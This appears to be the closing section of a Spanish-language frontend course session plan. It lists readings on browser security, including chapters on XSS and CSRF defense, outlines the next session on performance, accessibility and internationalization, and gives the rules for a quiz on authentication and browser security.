- `dev-notes/06-frontend/13-seguridad-en-el-navegador.md`, completa.

**Recomendadas**

- *React Application Architecture for Production* (Alickovic, 2026), cap. 7.
- *Web Application Security*, 2.ª ed. (Hoffman, 2023), caps. 10 (Cross-Site Scripting), 11 (Cross-Site Request Forgery), 28 (Defending Against XSS Attacks) y 29 (Defending Against CSRF Attacks).

Los libros se citan por capítulo; cada quien consigue su copia.

---

## Siguiente sesión

### S05 - Rendimiento, accesibilidad e idiomas

- Medir con el Profiler y con Lighthouse antes de optimizar.
- Dividir el código, y accesibilidad AA con teclado y lector de pantalla.
- Internacionalización.

> Optimizar sin medir antes es adivinar con más trabajo.

---

## Quiz: autenticación y seguridad en el navegador

- 10 preguntas por intento, sacadas de un banco de 12.
- Individual, sin el laboratorio abierto.
- Lo que falles, búscalo en la nota `13-seguridad-en-el-navegador` o en la documentación de MDN antes del siguiente intento.

<!-- Últimos 15 minutos. Revisa en voz alta la pregunta que más se falle. -->
